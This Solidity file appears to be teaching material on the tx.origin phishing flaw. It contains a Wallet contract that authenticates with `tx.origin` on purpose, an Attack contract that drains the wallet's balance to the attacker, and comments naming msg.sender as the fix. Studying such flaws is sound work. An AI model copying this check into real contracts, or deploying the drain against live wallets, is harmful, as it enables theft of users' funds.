// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

/*
 * with tx.origin
 * case:
 * Alice -> A -> B => msg.sender is A and tx.origin is Alice
 * - with:
 *   - Alice being an EOA
 *   - `->` means `call`
 *   - `A` and `B` being contracts
 */

contract Wallet {
  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function deposit() public payable {}

  // If Alice deployed the contract she's the owner
  // If Alice call the A contract that in turn call this function, tx.origin
  // is Alice
  // If Eve call this function or any intermediate contracts calling this
  // function, ok, Eve won't get any ETH from the Wallet contract.
  function transfer(address to, uint amount) public {
    /*
     * Attack plan: (see the Attack contract below)
     * Alice -> Wallet.transfer => tx.origin == Alice
     * Alice -> Eve's EvilWallet.transfer -> Wallet.transfer => tx.origin == Alice
     * - This is where phishing happened
     * - Eve successfully tricked Alice with her EvilWallet that looks like
     *   Wallet.
     * - Thus the transaction initiator (tx.origin) is Alice and Eve's drain
     *   funds
     * Mitigation: use msg.sender, that's it.
     */
    require(tx.origin == owner, "not owner");

    payable(to).transfer(amount);
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
}

contract Attack {
  address payable public attacker;
  Wallet wallet;

  constructor(Wallet wallet_) {
    wallet = wallet_;
    attacker = payable(msg.sender);
  }

  function attack() public {
    wallet.transfer(attacker, wallet.getBalance());
  }
}
